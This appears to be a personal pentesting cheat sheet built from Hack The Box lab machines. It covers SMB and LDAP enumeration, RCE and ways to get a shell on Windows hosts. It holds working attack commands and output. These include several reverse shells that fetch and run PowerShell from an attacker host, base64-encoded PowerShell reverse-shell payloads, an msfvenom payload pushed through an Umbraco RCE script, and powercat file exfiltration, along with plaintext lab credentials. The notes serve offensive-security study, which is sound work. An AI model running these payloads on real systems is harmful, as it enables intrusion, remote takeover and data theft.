### Index

1.  [Links](#Links)
2.  [Samba](#Samba)
	2.1  [Trying to List smb share using Guest account](#Trying%20to%20List%20smb%20share%20using%20Guest%20account)
	2.2  [Dumbing Password Policy through SMB Share](#Dumbing%20Password%20Policy%20through%20SMB%20Share)
	2.3  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
	2.4  [Connecting using `smbclient` with Credentials](#Connecting%20using%20`smbclient`%20with%20Credentials)
	2.5  [Spidering SMB shares](#Spidering%20SMB%20shares)
	2.6  [Listing the SMB Shares without password using smbclient](#Listing%20the%20SMB%20Shares%20without%20password%20using%20smbclient)
	2.7  [Listing SMB Share using Password or NTLM hash](#Listing%20SMB%20Share%20using%20Password%20or%20NTLM%20hash)
	2.8  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
	2.9  [Getting the file from SMB Share without password anonymously](#Getting%20the%20file%20from%20SMB%20Share%20without%20password%20anonymously)
	2.10  [Execute Command using smbmap](#Execute%20Command%20using%20smbmap)
	2.11  [smbmap - Non Recursive Path Listing](#smbmap%20-%20Non%20Recursive%20Path%20Listing)
	2.12  [Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.](#Get%20a%20Reverse%20shell%20using%20`smbmap`.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.)
3.  [Nmap](#Nmap)
4.  [CURL](#CURL)
	1. [Download the file on the target.](#Download%20the%20file%20on%20the%20target.)
5. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
	1. [RCE to Shell](#RCE%20to%20Shell)
	2. [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
	3. [`Using impacket-wmiexec`](#`Using%20impacket-wmiexec`)
	4. [`Using smbclient`](#`Using%20smbclient`)
	5. [`Using Telnet`](#`Using%20Telnet`)
	6. [`Using smbmap to run powershell command`](#`Using%20smbmap%20to%20run%20powershell%20command`)
	7. [`using rpcclient`](#`using%20rpcclient`)
	8. [`Using PowerShell`](#`Using%20PowerShell`)
	9. [`Print File Content using SQL Query (MYSQL)`](#`Print%20File%20Content%20using%20SQL%20Query%20(MYSQL)`)
6.  [PowerShell & Active Directory](#PowerShell%20&%20Active%20Directory)
	1. [`Print all the environment variables using powershell`.](#`Print%20all%20the%20environment%20variables%20using%20powershell`.)
	2. [`Importing PowerSploit and Other modules`](#`Importing%20PowerSploit%20and%20Other%20modules`)
	3. [`Copy the whole PowerSploit Directory as follows`](#`Copy%20the%20whole%20PowerSploit%20Directory%20as%20follows`)
	4. [`Checking the PowerShell history`](#`Checking%20the%20PowerShell%20history`)
	5. [`File Transfer Using PowerShell`](#`File%20Transfer%20Using%20PowerShell`)
7. [LDAP or WinDapSearch](#LDAP%20or%20WinDapSearch)
	1. [`Anonymous Bind`](#`Anonymous%20Bind`)
	2. [`Authenticated Bind`](#`Authenticated%20Bind`)
	3. [`Get Specific User`](#`Get%20Specific%20User`)
	4. [`LDAP With Credentials Enumeration`](#`LDAP%20With%20Credentials%20Enumeration`)
### Links

[LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
[CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
[Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo
[Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.
[Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu
[The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks
[GitHub - OSCP CheatSheet ](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering) - One of the OSCP Cheat Sheet
[SysInternals Tools EXEs](https://live.sysinternals.com/) - This link contains just Sysinternals Tools (System Internals) EXE file ready to use.

### Samba

###### Trying to List smb share using Guest account 
```
netexec smb 10.10.10.111 -u Guest -p "" --shares 
netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
```

###### Dumbing Password Policy through SMB Share
```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
```

###### Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
```
# smbclient //10.10.11.174/support-tools            
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
```
###### Connecting using `smbclient` with Credentials
```
# smbclient -U 'fabricorp.local/tlavel%Fabricorp01' //10.10.10.193/C$
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```
###### Spidering SMB shares

```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
```
###### Listing the SMB Shares without password using smbclient

```
$ smbclient --no-pass -L 10.10.10.134
$ smbclient --no-pass -L //<IP> # Null user
```
###### Listing SMB Share using Password or NTLM hash
```
$ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
```
###### Getting the file from SMB Share without password anonymously 
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
└─# smbclient //10.10.11.174/support-tools -c 'get putty.exe' 
Password for [WORKGROUP\root]:
getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (average 1294.2 KiloBytes/sec)

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
└─# ls                                                        
putty.exe
```
###### Execute Command using `smbmap`
```
# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
	# The `-d` switch can be ignored. 
```
###### smbmap - Non Recursive Path Listing
```
# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
```
###### Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
```
# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
```
### Nmap

Always run the nmap command in the following manner.
```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV <IP>
```

If you put the -sC or -sV parameters before --min-rate than your results might not have the Ports/Service versions.


Ongoing notes...Will add things later as I found during HTB machines

### CURL 

###### Download the file on the target.
```
Start the Python Server on Kali
python -m http.server 80

Run the following Command in Windows if Curl is Installed
curl -o FileName http://Kali_IP/FileName
```

### Ways to Get The Shell

###### RCE to Shell

During the Remote.htb, I had the following scenario.
```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```
###### Getting Shell When you have password

Getting Shell from RCE was achieved as follows
```
## Failed Attempt of using powershell

python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'

## Successful Attempt

$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
$ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'copy //10.10.14.4/a/revshell.exe C:/Windows/Temp/revshell.exe'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/Windows/Temp/revshell.exe' #Make sure the listener is On in another tab
```

During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.

###### `Using impacket-wmiexec`
```
$ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator
```

###### `Using smbclient`
```
$ smbclient -U Administrator \\\\10.10.10.180\\C$
Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
```

###### `Using Telnet`
```
$ telnet access.htb
C:\Users\security>
```

###### `Using smbmap to run powershell command`
```
# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
```

###### `using rpcclient`
```
# rpcclient -U 'bhult%Fabricorp012' 10.10.10.193
```

###### `Using PowerShell`
```
$PSW = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$LOGIN = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc',$PSW)

#Now Use revshell.com and Generate PowerShell V3 (Base64)

Invoke-Command -Computer dc1 -Credential $LOGIN -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=}
```

###### `Print File Content using SQL Query (MYSQL)`
```
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SINGLE_CLOB) MyFile
```
### PowerShell & Active Directory

###### `Print all the environment variables using powershell`.
```
Get-ChildItem env:
```

###### `Importing PowerSploit and Other modules` 
```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Recon
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Privesc
```
Note that I am inside the PowerSploit directory where Recon and Privesc directories are located. Now you can retrieve the command for each module like this.

```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Get-Command -Module Recon
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Add-NetUser                                        3.0.0.0    Recon
```

###### `Copy the whole PowerSploit Directory as follows`
```
*Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
```

###### `Checking the PowerShell history`
```
*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
```

###### `File Transfer Using PowerShell`
```
PS C:\ProgramData> curl -o powercat.ps1 http://10.10.14.2/powercat.ps1
PS C:\ProgramData> powercat -c 10.10.14.2 -p 1234 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe" 
#Start the NetCat Listener using nc -l -p 1234 > FileName.exe
```
### LDAP or WinDapSearch

Alternate tool: [WinDapSearch](https://github.com/ropnop/windapsearch)
###### `Anonymous Bind`
```
ldapsearch -H ldap://athos.host -x -LLL
ldapsearch -H ldap://athos.host -x -LLL -b '' -s base namingContexts
ldapsearch -H ldap://athos.host -x -LLL -b 'dc=athos,dc=host' 'dn'
```
###### `Authenticated Bind`
```
ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
```
###### `Get Specific User`
```
ldapsearch -xLLL -H ldaps://<ldap server> -b 'ou=People,dc=metricinsights,dc=com' '(uid=testuser1)' 
```
###### `LDAP With Credentials Enumeration`
```
ldapsearch -xLLL -H ldaps://<ldap server> -D '<ldap credentials username>' -W -b 'CN=Users,DC=metricinsights,DC=com' 'samaccountname=tester1'
```